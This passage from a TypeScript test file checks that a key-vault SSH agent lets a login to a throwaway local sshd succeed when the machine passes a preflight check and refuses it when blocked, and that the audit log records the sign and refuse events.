  test("ssh logs in to a throwaway local sshd through the agent while the machine passes, and not while it is blocked", () => withState(async (d) => {
    const srv = join(d.home, "sshd");
    mkdirSync(srv);
    await keygen(srv, "host_key");
    const k = await keygen(d.home, "prod");
    writeFileSync(join(srv, "authorized_keys"), readFileSync(`${k}.pub`));
    const port = 20000 + Math.floor(Math.random() * 20000);
    writeFileSync(join(srv, "config"), [
      `Port ${port}`, "ListenAddress 127.0.0.1", `HostKey ${join(srv, "host_key")}`, `PidFile ${join(srv, "pid")}`, "UsePAM no", "StrictModes no",
      "PasswordAuthentication no", "KbdInteractiveAuthentication no", `AuthorizedKeysFile ${join(srv, "authorized_keys")}`,
    ].join("\n") + "\n");
    // The private key goes into the vault; only the agent can log in with it now.
    await protect(k, { env: envWith() });
    const { a, told } = await agentFor(d);
    expect((await sh(["/usr/sbin/sshd", "-f", join(srv, "config"), "-E", join(srv, "log")])).code).toBe(0);
    const ssh = () => sh(["ssh", "-F", "/dev/null", "-p", String(port), "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "GlobalKnownHostsFile=/dev/null",
      "-o", `IdentityAgent=${a.sock}`, "-o", `IdentityFile=${k}.pub`, "-o", "IdentitiesOnly=yes", "127.0.0.1", "echo OK"], envWith());
    try {
      for (let i = 0; i < 30 && !existsSync(join(srv, "pid")); i++) await Bun.sleep(100);
      await sealed("pass");
      expect((await ssh()).out.trim()).toBe("OK");
      await sealed("block");
      const r = await ssh();
      expect(r.out.trim()).toBe("");
      expect(r.err).toMatch(/agent refused|Permission denied/);
      expect(told.at(-1)).toContain("does not pass preflight");
      const audit = await readAudit();
      expect(audit.entries.map((e) => e.event)).toEqual(["sign", "refuse"]);
      // The login is named in the log: the account, the algorithm, and the server's host key.
      const hostFp = (await sh(["ssh-keygen", "-l", "-f", join(srv, "host_key.pub")])).out.split(" ")[1];
      expect(audit.entries[0].reason).toContain("ssh login as");
      expect(audit.entries[0].reason).toContain("alg ssh-ed25519");
      expect(audit.entries[0].reason).toContain(`host key ${hostFp}`);
    } finally {
      a.stop();
      try {
        process.kill(Number(readFileSync(join(srv, "pid"), "utf8")));
      } catch {}
    }
  }), 60_000);
});
